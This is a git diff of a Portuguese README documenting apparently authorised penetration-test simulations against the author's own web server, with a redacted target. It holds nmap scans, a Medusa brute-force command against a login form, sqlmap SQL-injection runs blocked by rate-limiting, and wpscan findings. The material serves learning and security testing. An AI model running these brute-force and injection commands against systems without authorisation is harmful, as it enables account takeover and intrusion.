@@ -1,47 +1,55 @@
-# simulacoes_kali_1
-Simulações usando Medusa e Nmap
+# simulacoes_kali_1**
+Simulações usando Medusa e Nmap**
 
-Simulações utilizando um alvo real, dentro do meu servidor
+**Simulações utilizando um alvo real, dentro do meu servidor**
 
-Identificando quais serviços estão instalados no alvo
+# Identificando quais serviços estão instalados no alvo
+
+```bash
 [kali@customer ~]$ nmap -sV OCULTADO
+```
+
+Resultado:
+
+```text
 Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-10 18:50 -03
+
 Nmap scan report for OCULTADO (IP OCULTADO)
 Host is up (0.20s latency).
-Not shown: 962 filtered tcp ports (no-response), 34 closed tcp ports (conn-refused)
+
+Not shown: 962 filtered tcp ports (no-response),
+34 closed tcp ports (conn-refused)
+
 PORT     STATE SERVICE  VERSION
 21/tcp   open  ftp      ProFTPD or KnFTPD
 80/tcp   open  http     LiteSpeed httpd
 443/tcp  open  ssl/http LiteSpeed httpd
 3306/tcp open  mysql?
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port3306-TCP:V=7.93%I=7%D=5/10%Time=6A00FDD4%P=x86_64-redhat-linux-gnu%
-SF:r(NULL,5A,"V\0\0\0\n11\.8\.6-MariaDB-log\0\t\xad\x8a\x07e/VE5y%G\0\xfe\
-SF:xff\xe0\x02\0\xff\x81\x15\0\0\0\0\0\0=\0\0\0wC&1f1\\_E}gi\0mysql_native
-SF:_password\0")%r(GenericLines,97,"V\0\0\0\n11\.8\.6-MariaDB-log\0\t\xad\
-SF:x8a\x07e/VE5y%G\0\xfe\xff\xe0\x02\0\xff\x81\x15\0\0\0\0\0\0=\0\0\0wC&1f
-SF:1\\_E}gi\0mysql_native_password\x009\0\0\x01\xffj\x04#HY000Proxy\x20hea
-SF:der\x20is\x20not\x20accepted\x20from\x20153\.67\.107\.231")%r(LDAPBindR
-SF:eq,5A,"V\0\0\0\n11\.8\.6-MariaDB-log\0=\xae\x8a\x07XY49_Tg\)\0\xfe\xff\
-SF:xe0\x02\0\xff\x81\x15\0\0\0\0\0\0=\0\0\x004j<\*\]tPstj8v\0mysql_native_
-SF:password\0")%r(afp,5A,"V\0\0\0\n11\.8\.6-MariaDB-log\0\xe0\xae\x8a\x079
-SF:8Ob!zfp\0\xfe\xff\xe0\x02\0\xff\x81\x15\0\0\0\0\0\0=\0\0\0!MBDkqv\|/nay
-SF:\0mysql_native_password\0");
-Service Info: OS: Unix
 
-Complementando comando acima
+Service Info: OS: Unix
+```
+
+## Complementando comando acima
+
+```bash
 nmap --script ssl-cert,ssl-enum-ciphers -p 443 OCULTADO
+
 nmap --script ftp-anon -p 21 OCULTADO
+
 nmap --script mysql-info -p 3306 OCULTADO
+```
 
 Resultado, 3 serviços ativos, o que é comum em ambientes de hospedagem web.
 Encontrado Let's Encrypt, senhas receberam nota A, ambiente do banco de dados está exposto publicamente com a versão 11.8.6-MariaDB-log
 
 Testes elaborados com o Medusa e site externo
+```
 medusa -h OCULTADO -U users.txt -P pass.txt -M http \ -m PAGE:'https://OCULTADO/#/login' \ -m FORM:'email=^USER^&password=^PASS' \ -m 'FAIL=Invalid email or password.' -t 6
+```
 Usuários encontrados: user, admin, root, teste com as senhas
 
-Testes de sql injection
+**Testes de sql injection**
+```
 sqlmap -u 'OCULTADO/search?q=teste'
 [*] starting @ 20:06:13 /2026-05-10/
 
@@ -70,20 +78,34 @@ it is recommended to perform only basic UNION tests if there is not at least one
 [20:07:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
 [20:07:23] [WARNING] GET parameter 'utm_source' does not seem to be injectable
 [20:07:23] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+```
 
+```
 sqlmap -u "https://OCULTADO/admin/index.php" --method POST --data='{"email":"?","senha":"?"}' --headers="Content-Type: application/json"
+```
+
 403 (Forbidden) - 120 times, 429 (Too Many Requests) - 24 times
+
 Aqui o servidor interrompeu as requisições
 Interessante ver o log do lado do servidor, apontando que houve a requisição pelo sqlmap
 <img width="952" height="339" alt="image" src="https://github.com/user-attachments/assets/6c712ed2-b829-48a8-bbe3-7cde91668678" />
 
-Testes usando o wpscan
+**Testes usando o wpscan**
+```
 wpscan --url OCULTADO
-WordPress 6.9.4 - versão atualizada
-wp-cron.php acessível externamente, pode permitir consumo excessivo
-xmlrpc.php acessível
-readme.html acessível, podendo indicar dados de instalação
-robots.txt acessível, podendo indicar áreas ocultas
-Tema Royal Elementor Kit
-Alguns plugins um pouco desatualizados
-Sem backup encontrado
+```
+- WordPress 6.9.4 identificado (versão atualizada)
+
+- `wp-cron.php` acessível externamente, podendo permitir consumo excessivo de recursos
+
+- `xmlrpc.php` acessível
+
+- `readme.html` acessível, podendo indicar informações de instalação
+
+- `robots.txt` acessível, podendo indicar áreas ocultas
+
+- Tema identificado: Royal Elementor Kit
+
+- Alguns plugins levemente desatualizados
+
+- Nenhum backup exposto encontrado
